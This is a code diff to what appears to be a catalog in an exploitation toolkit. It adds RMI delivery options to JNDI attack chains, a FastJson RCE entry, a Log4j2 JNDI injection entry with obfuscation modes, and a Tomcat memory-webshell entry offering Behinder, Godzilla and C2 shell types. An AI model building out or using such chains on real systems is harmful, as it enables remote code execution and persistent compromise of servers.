@@ -163,7 +163,7 @@ CATALOG: list[ChainEntry] = [
     ChainEntry(
         id="jndi_rmi_basic", category="jndi", sub_category="RMI",
         name="JNDI RMI Basic",
-        description="RMI reference is currently not implemented by OOBserver RMI listener.",
+        description="RMI registry reference pointing at sidecar-served bytecode.",
         params=[
             ParamSpec("token", "string", required=True),
             ParamSpec("class_name", "string", default="Exploit"),
@@ -227,7 +227,7 @@ CATALOG: list[ChainEntry] = [
                       options=["behinder", "godzilla", "cmd", "c2", "custom"]),
             ParamSpec("custom_code", "string", description="Base64 bytecode for custom shell type"),
             ParamSpec("deliver_via", "select", default="class_load",
-                      options=["class_load", "jndi_ldap", "serialize"]),
+                      options=["class_load", "jndi_ldap", "jndi_rmi", "serialize"]),
             ParamSpec("token", "string", description="OOB token for JNDI delivery"),
         ],
         tags=["memshell", "tomcat", "filter", "c2"],
@@ -428,7 +428,7 @@ CATALOG: list[ChainEntry] = [
         description="FastJson 1.2.x RCE via JdbcRowSetImpl.dataSourceName JNDI trigger",
         params=[
             ParamSpec("token", "string", required=True),
-            ParamSpec("ldap_or_rmi", "select", default="ldap", options=["ldap"]),
+            ParamSpec("ldap_or_rmi", "select", default="ldap", options=["ldap", "rmi"]),
         ],
         requires_sidecar=False,
         tags=["fastjson", "jndi", "rce"],
@@ -598,7 +598,7 @@ CATALOG: list[ChainEntry] = [
         description="Log4j2 JNDI injection string — ${jndi:ldap://...} with token-encoded callback",
         params=[
             ParamSpec("token", "string", required=True),
-            ParamSpec("protocol", "select", default="ldap", options=["ldap"]),
+            ParamSpec("protocol", "select", default="ldap", options=["ldap", "rmi"]),
             ParamSpec("obfuscate", "select", default="none",
                       options=["none", "upper_lookup", "lower_lookup", "date_format", "nested"]),
         ],
